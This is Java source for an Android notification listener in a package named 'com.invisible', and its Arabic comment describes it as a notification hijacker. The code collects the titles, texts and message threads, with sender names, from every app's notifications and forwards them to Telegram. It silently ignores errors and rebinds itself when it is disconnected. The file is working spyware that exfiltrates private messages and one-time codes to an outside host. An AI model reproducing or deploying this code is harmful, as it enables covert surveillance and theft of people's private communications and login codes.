package com.invisible;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

/**
 * خاطف الإشعارات - يلتقط جميع إشعارات الجهاز ويرسلها لتليغرام
 */
public class NotifListener extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Notification notif = sbn.getNotification();
            if (notif == null) return;

            Bundle extras = notif.extras;
            if (extras == null) return;

            String packageName = sbn.getPackageName();
            String appName = getAppLabel(packageName);
            long postTime = sbn.getPostTime();

            // استخراج العنوان
            String title = safeStr(extras.getCharSequence(Notification.EXTRA_TITLE));

            // استخراج كل النصوص الممكنة
            StringBuilder sb = new StringBuilder();
            appendIf(sb, extras.getCharSequence(Notification.EXTRA_TEXT));
            appendIf(sb, extras.getCharSequence(Notification.EXTRA_BIG_TEXT));
            appendIf(sb, extras.getCharSequence(Notification.EXTRA_SUB_TEXT));
            appendIf(sb, extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT));

            // نصوص متعددة (InboxStyle, MessagingStyle)
            CharSequence[] lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES);
            if (lines != null) {
                for (CharSequence line : lines) {
                    appendIf(sb, line);
                }
            }

            // رسائل (MessagingStyle)
            android.app.Notification.MessagingStyle.Message[] messages =
                    android.app.Notification.MessagingStyle.Message.getMessagesFromBundleArray(
                            extras.getParcelableArray(Notification.EXTRA_MESSAGES));
            if (messages != null) {
                for (android.app.Notification.MessagingStyle.Message msg : messages) {
                    if (msg.getSender() != null && msg.getText() != null) {
                        sb.append("[").append(msg.getSender()).append("]: ")
                                .append(msg.getText()).append("\n");
                    }
                }
            }

            String text = sb.toString().trim();
            if (title.isEmpty() && text.isEmpty()) return;

            // قص النص الطويل
            String full = title + "\n" + text;
            if (full.length() > 3700) {
                full = full.substring(0, 3700) + "... [TRUNCATED]";
            }

            String timeStr = new java.text.SimpleDateFormat("HH:mm:ss")
                    .format(new java.util.Date(postTime));

            String msg = "\uD83D\uDD14 <b>\u0625\u0634\u0639\u0627\u0631 \u062C\u062F\u064A\u062F</b>\n"
                    + "\u251C \u0627\u0644\u062A\u0637\u0628\u064A\u0642: <code>" + e(appName) + "</code>\n"
                    + "\u251C \u0627\u0644\u062D\u0632\u0645\u0629: <code>" + e(packageName) + "</code>\n"
                    + "\u251C \u0627\u0644\u0648\u0642\u062A: " + timeStr + "\n"
                    + "\u2514 \u0627\u0644\u0645\u062D\u062A\u0648\u0649:\n<pre>" + e(full) + "</pre>";

            TelegramSocket.send(msg);

        } catch (Exception ignored) {}
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        TelegramSocket.send("\u2705 <b>Notification Listener connected</b>");
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        // محاولة إعادة الربط
        try {
            requestRebind(new android.content.ComponentName(this, NotifListener.class));
        } catch (Exception ignored) {}
    }

    // ===== HELPERS =====

    private String getAppLabel(String pkg) {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return pkg;
        }
    }

    private String safeStr(CharSequence cs) {
        return cs != null ? cs.toString() : "";
    }

    private void appendIf(StringBuilder sb, CharSequence cs) {
        if (cs != null && cs.length() > 0) {
            if (sb.length() > 0) sb.append("\n");
            sb.append(cs.toString());
        }
    }

    private String e(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }
}
